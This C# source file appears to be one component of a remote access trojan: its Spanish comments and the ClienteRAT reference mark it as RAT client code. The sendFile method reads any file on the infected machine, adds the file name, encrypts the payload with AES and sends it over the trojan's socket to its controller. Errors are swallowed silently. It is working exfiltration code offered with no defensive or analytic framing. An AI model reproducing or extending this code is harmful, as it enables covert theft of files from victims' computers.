
using System.Text;
using Client.Conexion;
using Client.Crypto;

namespace Client.Util
{
    public static class FileManager
    {
        public static void sendFile(string filePath)
        {
            if (!File.Exists(filePath))
                return;

            try
            {
                string fileName = Path.GetFileName(filePath);
                byte[] fileContent = File.ReadAllBytes(filePath);

                // Codificamos así: <nombre_archivo>\n<contenido_binario>
                byte[] fileNameBytes = Encoding.UTF8.GetBytes(fileName + "\n");

                // Concatenamos el nombre y el contenido en un solo payload
                byte[] payload = new byte[fileNameBytes.Length + fileContent.Length];
                Buffer.BlockCopy(fileNameBytes, 0, payload, 0, fileNameBytes.Length);
                Buffer.BlockCopy(fileContent, 0, payload, fileNameBytes.Length, fileContent.Length);

                byte[] encryptedPayload = AesHelper.EncryptWithAes(payload, ClienteRAT.getAesKey());
                // Enviar usando el protocolo
                Protocol.Send(ClientSocket.getClientStream(), Channel.File, encryptedPayload);
            }
            catch (Exception ex)
            {
                // Manejo de errores
            }

        } 
    }
}
